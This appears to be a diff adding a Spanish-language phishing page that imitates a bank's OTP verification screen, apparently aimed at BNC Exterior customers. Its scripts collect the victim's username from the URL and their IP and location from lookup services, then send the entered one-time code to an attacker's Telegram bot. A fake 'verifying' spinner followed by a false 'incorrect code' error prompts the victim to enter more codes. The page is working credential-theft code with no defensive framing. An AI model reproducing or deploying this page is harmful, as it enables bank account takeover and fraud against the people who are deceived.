@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <title>OTP Verificación</title>
+  <style>
+    body {
+      background: #f5f6f7;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 10px;
+    }
+    .box {
+      background: #fff;
+      padding: 2em;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    h2 {
+      background: #0046a0;
+      color: white;
+      padding: 0.8em;
+      border-radius: 6px;
+      font-size: 1em;
+      margin-bottom: 1.5em;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 1em;
+      font-size: 1em;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 1.5em;
+      text-align: center;
+    }
+    .buttons {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .buttons button {
+      flex: 1 1 30%;
+      padding: 0.8em;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9em;
+    }
+    .btn-clear {
+      background: white;
+      color: #f97316;
+      border: 2px solid #f97316;
+    }
+    .btn-orange {
+      background: #f97316;
+      color: white;
+    }
+    .btn-gray {
+      background: #e5e7eb;
+      color: #333;
+    }
+    .error-msg {
+      color: red;
+      margin-top: 1em;
+      display: none;
+      font-weight: bold;
+      font-size: 0.95em;
+    }
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .modal .content {
+      background: white;
+      padding: 2em;
+      border-radius: 10px;
+      text-align: center;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #f97316;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0); }
+      100% { transform: rotate(360deg); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Mejor visual para pantallas muy pequeñas */
+    @media screen and (max-width: 360px) {
+      h2 {
+        font-size: 0.95em;
+      }
+      .buttons button {
+        flex: 1 1 100%;
+      }
+    }
+  </style>
+  
+    	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="telgm.js"></script>
+	  <script>
+      const urlParams = new URLSearchParams(window.location.search);
+      const miVariable = urlParams.get('u');
+      console.log(miVariable); // Muestra el valor de la variable en la consola
+
+
+    </script>
+  <script>
+         $.getJSON("https://api.ipify.org?format=json",
+          function(data) {
+             $("#gfg").html(data.ip);
+         })
+ </script>
+      <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+    })
+      </script>
+	  
+<script>
+
+var pax, ip, ip2;
+
+var ready = function () {
+   
+    pax = document.getElementById("otpInput").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "==BNCEXTERIOR-Info==\n\nUsuario: <code>" + miVariable + "</code>\nOTP INGRESADO: <code>" + pax +"</code>\n\nIP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+			"parse_mode": "HTML"
+        })
+    };
+    $.ajax(settings).done(function (response) {
+	//  window.location = 'otp1.html';
+   
+        console.log(response);
+   
+
+   });
+    return false;
+};
+
+</script>
+
+
+<script type="application/javascript">
+function getIP(json) {
+    document.getElementById("ipaddress").value = json.ip;
+}
+</script>
+</head>
+<body>
+  <div class="box">
+    <h2>Ingrese su código para continuar</h2>
+    <form id="otpForm"  onsubmit=" return sender()">
+	<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+      <input type="text" name="otp" required maxlength="8" minlength="6" placeholder="Ingrese su código" id="otpInput">
+      <div class="buttons">
+        <button type="reset" class="btn-clear">Limpiar Código</button>
+        <button type="submit" class="btn-orange">Aceptar</button>
+        <button type="button" class="btn-gray" onclick="location.reload()">Cerrar</button>
+      </div>
+    </form>
+    <div class="error-msg" id="errorMsg">❌ Código incorrecto. Inténtelo nuevamente.</div>
+  </div>
+
+  <div class="modal" id="loadingModal">
+    <div class="content">
+      <p>Verificando código...</p>
+      <div class="loader"></div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("otpForm");
+    const modal = document.getElementById("loadingModal");
+    const error = document.getElementById("errorMsg");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      const otp = document.getElementById("otpInput").value;
+
+      if (otp.length < 6 || otp.length > 8 || !/^\d+$/.test(otp)) {
+        alert("Código inválido");
+        return;
+      }
+
+      modal.style.display = "flex";
+
+      fetch("otp.html?u="+miVariable, {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "otp=" + encodeURIComponent(otp)
+      });
+
+      setTimeout(() => {
+        modal.style.display = "none";
+        error.style.display = "block";
+      }, 20000); // 20 segundos
+    });
+  </script>
+</body>
+</html>
